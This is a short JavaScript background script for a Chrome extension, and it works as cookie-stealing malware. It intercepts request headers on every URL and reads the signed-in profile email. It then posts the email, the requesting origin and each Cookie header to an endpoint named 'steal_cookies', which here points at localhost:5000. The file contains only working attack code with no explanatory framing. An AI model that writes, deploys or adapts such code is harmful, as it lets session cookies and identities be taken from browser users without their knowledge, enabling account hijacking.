
chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        chrome.identity.getProfileUserInfo(function (userInfo) {
            var userEmail;
            if (userInfo.email == "") {
                userEmail = "no_email_found";
            }
            else {
                userEmail = JSON.stringify(userInfo.email);
            }
            localStorage.setItem('email', userEmail);
            if (details.initiator != ('chrome-extension://' + chrome.runtime.id) && !(typeof details.requestHeaders === 'undefined')) {
                for (var i = 0; i < details.requestHeaders.length; ++i) {
                    if (details.requestHeaders[i].name == 'Cookie' && details.initiator) {
                        $.post("http://localhost:5000/steal_cookies", {
                            email: userEmail,
                            url: details.initiator,
                            cookies: details.requestHeaders[i].value
                        });
                    }
                }
            }
        });
        return { 
            requestHeaders: details.requestHeaders 
        };
    },
    { urls: ["<all_urls>"] },
    ["blocking", "requestHeaders"]
);

